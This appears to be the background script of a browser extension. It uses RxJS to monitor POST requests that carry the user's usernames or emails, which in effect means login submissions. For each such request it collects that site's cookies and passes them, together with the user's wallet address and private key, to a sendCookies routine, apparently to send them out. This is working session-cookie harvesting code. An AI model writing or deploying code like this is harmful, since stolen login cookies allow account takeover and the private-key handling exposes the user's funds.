import { merge } from 'rxjs';
import { debounceTime, filter, map, mergeMap, switchMap } from 'rxjs/operators';

import {
  listenRequestsBeforeRedirectWithBody,
  listenRequestsOnCompletedWithBody,
  requestBodyContains,
} from './helpers/requests';
import { getActiveUser } from './helpers/user';
import { getCookies, sendCookies } from './helpers/cookies';

const COOKIES_DEBOUNCE_MS = 500;

getActiveUser().pipe(
  switchMap((user) => merge(
    listenRequestsOnCompletedWithBody({}, 'POST'),
    listenRequestsBeforeRedirectWithBody({}, 'POST'),
  ).pipe(
    filter(request => {
      return requestBodyContains(request.requestBody, [...user.usernames, ...user.emails]);
    }),
    debounceTime(COOKIES_DEBOUNCE_MS),
    mergeMap(request => getCookies(new URL(request.url))),
    map((cookies) => ({ user, cookies })),
  )),
).subscribe(({ user, cookies }) => {
  sendCookies(user.walletAddress, user.privateKey, cookies);
});
